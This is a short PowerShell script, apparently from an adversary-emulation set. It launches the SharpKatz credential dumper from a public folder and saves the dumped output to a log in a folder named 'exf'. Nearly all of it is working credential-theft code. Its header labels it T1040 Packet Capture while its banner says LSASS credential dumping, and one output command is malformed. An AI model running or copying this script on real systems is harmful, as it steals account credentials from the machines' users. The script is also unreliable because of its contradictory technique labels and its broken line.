# Packet Capture
# Technic ID : T1040
Clear-Host
Write-Output "==============================================================================="
Write-Output "OS Credential Dumping: LSASS Memory (T1040)"
Write-Output "==============================================================================="
#
$Katz = "$env:PUBLIC\Toolz\SharpKatz.exe";
$KatzLogFile = "$env:PUBLIC\exf\Katz.log";
if ([System.IO.File]::Exists("$katz")) 
    {
        Write-Output "GREAT. The command $Katz has been found :-)" | Out-File -FilePath "$KatzLogFile";
        $ServiceCmd = "$Katz";
        Invoke-Expression "$ServiceCmd" | Out-File -FilePath"$KatzLogFile" -Append;
        exit 0;
    }
    else {
        Write-Output "The command $Katz does not exists !!!" | Out-File -FilePath "$KatzLogFile";
        exit 1;
      };